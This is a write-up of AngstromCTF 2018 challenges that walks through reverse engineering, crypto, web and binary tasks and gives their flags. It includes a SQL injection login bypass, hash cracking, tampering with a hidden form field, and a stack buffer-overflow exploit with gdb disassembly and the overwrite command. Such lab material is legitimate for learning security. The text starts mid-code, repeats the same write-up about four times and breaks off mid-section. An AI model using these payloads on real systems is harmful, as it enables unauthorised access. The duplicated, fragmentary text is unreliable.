                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
Flag: `actf{signed_ints_aint_safe}`

### **Cookie Jar**
For this challenge you were given the source (without the Flag) and a remote address where you can get the flag after you found out how to pwn the code. The binary saved the user input into a buffer[64]. By entering a number larger than 64 bits, you could overflow the buffer it and retrieve the flag. 

Points: 60
Flag: `actf{eat_cookies_get_buffer}`
  
### **Rop to the Top**
This challenge requires us to call an unused function which displays the flag.

The function we should call is called `the_top`:
```c
void the_top() {
	system("/bin/cat flag");
}
```

The function which we can use to access it is called `fun_copy`:
```c
void fun_copy(char *input) {
	char destination[32];
	strcpy(destination, input);
	puts("Done!");
}
```

First, we have a look at the executable with GDB:
```bash
gdb -q rop_to_the_top32
```

Finding out where `the_top` is:
```bash
(gdb) print the_top
$1 = {<text variable, no debug info>} 0x80484db <the_top>```
`the_top` is at 0x080484db

Disassembling `fun_copy`:
```bash
(gdb) disas fun_copy
Dump of assembler code for function fun_copy:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x28,%esp
   0x080484fa <+6>:     sub    $0x8,%esp
   0x080484fd <+9>:     pushl  0x8(%ebp)
   0x08048500 <+12>:    lea    -0x28(%ebp),%eax
   0x08048503 <+15>:    push   %eax
   0x08048504 <+16>:    call   0x8048380 <strcpy@plt>
   0x08048509 <+21>:    add    $0x10,%esp
   0x0804850c <+24>:    sub    $0xc,%esp
   0x0804850f <+27>:    push   $0x804862e
   0x08048514 <+32>:    call   0x8048390 <puts@plt>
   0x08048519 <+37>:    add    $0x10,%esp
   0x0804851c <+40>:    nop
   0x0804851d <+41>:    leave
   0x0804851e <+42>:    ret
End of assembler dump.
```
The buffer is 0x28 (40) bytes long.

To overwrite the return address on the stack, we have to add another 4 bytes.
This means we have to write:
* 44 bytes to get to the return address
* Return Address (4 bytes)

Calling the program with the correct argument:
```bash
$ ./rop_to_the_top32 $(for i in {1..44}; do echo -n 'a'; done; echo -ne '\xdb\x84\x04\x08')
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault (core dumped)
```

Points: 130  
Flag: `actf{strut_your_stuff}`

# AngstromCTF 2018
Team: https://ctftime.org/team/53225  
Due to time limitations (school, etc.) this writeup isn't complete.  
  
----------

## **Misc**
### **IRC**
The first challenge was pretty easy, you just had to join the IRC Server and retrieve the flag from the channel description.
  
Points: 10  
Flag: `actf{irc}`  

### **Waldo 1**
There challenge description had a .zip archive, with 5 pictures of flags attached. One of the pictures had the flag on it.  
  
Points: 10  
Flag: `actf{there_is_no_collusion_(between_teams)}`  
  
### **Waldo 2**
This challenge was simmilar to the WALDO 1 challenge, but contained 500 images instead of 5.  
I've used the tool fdupes, to delete the duplicates. The remaining image had to be opened in a text editor, where you got the flag.  
  
Points: 30  
Flag: `actf{r3d_4nd_wh1t3_str1p3s}`  
  
### **That's Not My Name**
This challenge had a .pdf file attached. The pdf file couldn't be opened with normal PDF readers, since the file type was "application/zip". The file command gave me `gettysburg.pdf: Microsoft OOXML`. OOXML stands for Open Office XML. Libreoffice Writer was finally able to open it.  
  
Points: 40  
Flag: `actf{thanks_mr_lincoln_but_who_even_uses_word_anymore}`  
  
### **File Transfer**
This challenge's attachment was a .pcap network capture. It showed some requests to file.io, especially a GET to file.io/f2J0Qi. The link was already 404'd, but at the bottom of the capture there was a captured JPEG image from the site. I've exported the image via Wireshark, and got the flag from it.  
  
Points: 40  
Flag: `actf{0ver_th3_w1re}`  
  
### **GIF**
This challenge had a "broken" .gif file attached. Via binwalk you could see that there were multiple PNGs inside. I've used `binwalk -D 'png image:png' jiggs.gif` to extract these images. One of them contained the flag.
  
Points: 50  
Flag: `actf{thats_not_how_you_make_gifs}` 
   
## **Crypto**
### **Warumup**
This challenge had a text, encrypted with the affine cipher attached. I've created a small python script to brute force the flag by trying to encrypt the given text with all possible combinations.  
  
Script: crypto/warmup.py  
Points: 10   
Flag: `actf{it_begins}`  
  
### **Back to Base-ICS**
This challenge's attachment contained 4 parts of the flag, each encoded with a different base.  
The first one was using binary, the second one octal, the third one hex and the last one base64.  
After converting each one to text and concating them, you had the flag.
  
Points: 20  
Flag: `actf{0ne_tw0_f0ur_eight_sixt33n_th1rtytw0_s1xtyf0ur_no_m0re}`  
  
### **XOR**
The given text was in Hexadecimal, I've converted it to text and, since I know that the first chars had to be `actf{` I was able to decrypt the text via with cryptii.com 
  
Points: 40   
Flag: `actf{hope_you_used_a_script}`   
  
## **RE**
### **run me**
This challenge was pretty easy, you just had to SSH into the server and run the executable `/problems/run_me/run_me` 
  
Points: 20  
Flag: `actf{why_did_you_run_me}`  
  
### **REV1**
The executable asked for a password in exchange for the flag. Via the strings command I was able to extract the password & run it.
  
Points: 60  
Flag: `actf{r3v_is_just_gettin_started!}` 
  
### **REV2**
For this challenge the strings command wasn't enough, you had to disassemble the executable. I've used the Hopper Disassembler to convert the executable's assembly to pseudo code. The first part of the solution was "4567"  
```
if (*(ebp - 0x1c) != 0x11d7) {
    printf("Sorry, your guess of %d was incorrect. Try again!\n", *(ebp - 0x1c));
    eax = 0x0;
}
``` 
  
The second part was "47 73"  
```
if ((((*(ebp - 0x18) <= 0x63) && (*(ebp - 0x18) > 0x9)) && (*(ebp - 0x14) <= 0x63)) && (*(ebp - 0x14) > 0x9)) {
            if (*(ebp - 0x18) > *(ebp - 0x14)) {
                    puts("Numbers do not meet specifications. Try again!");
                    eax = 0x0;
            } else {
                    *(ebp - 0x10) = *(ebp - 0x14) * *(ebp - 0x18);
                    if (*(ebp - 0x10) != 0xd67) {
                            printf("Sorry, your guess of %d and %d was incorrect. Try again!\n", *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    } else {
                            printf("Congrats, you passed Rev2! The flag is: actf{%d_%d_%d}\n", *(ebp - 0x1c), *(ebp - 0x18), *(ebp - 0x14));
                            eax = 0x0;
                    }
            }
        } else {
                puts("Numbers do not meet specifications. Try again!");
                eax = 0x0;
        }
}
```
  
Points: 80  
Flag: `actf{4567_47_73}`  
  
## **Web**
### **Source Me 1**
The password for this challenge was written in the page's source code as a HTML comment.
With that password you could login and retrieve the flag.
  
Points: 20  
Flag: `actf{source_aint_secure}`  
  
### **Get Me**
The page had a form with a "Submit" button. If you would click on it it responded with "You're not authorized". There was a second hidden form element called "auth". After un-hiding it, and replacing the value "false" with "true" it worked & printed out the flag.  
  
Points: 30  
Flag: `actf{why_did_you_get_me}`  
  
### **Source Me 2**
The page had a javascript login form on it. In the JS source code there was the MD5 hash which should match the password input. I've used https://crackstation.net/'s rainbow table to crack the hash and retrieve the flag via the password. 
  
Points: 50  
Flag: `actf{md5_hash_browns_and_pasta_sauce}`  
  
### **Sequel**
This challenge had a login form written in PHP. In order to gain access to the flag, you had to circumvent the SQL powered login. By entering `' or '1'='1` as username and password you would get the flag. 
  
Points: 50  
Flag: `actf{sql_injection_more_like_prequel_injection}`  
  
## **Binary**
### **Accumulator**
This challenge only allows you to add positive numbers to a value. You get the flag when the number is negative. To achieve this, you can add very large numbers to the value until it overflows.

Points: 50
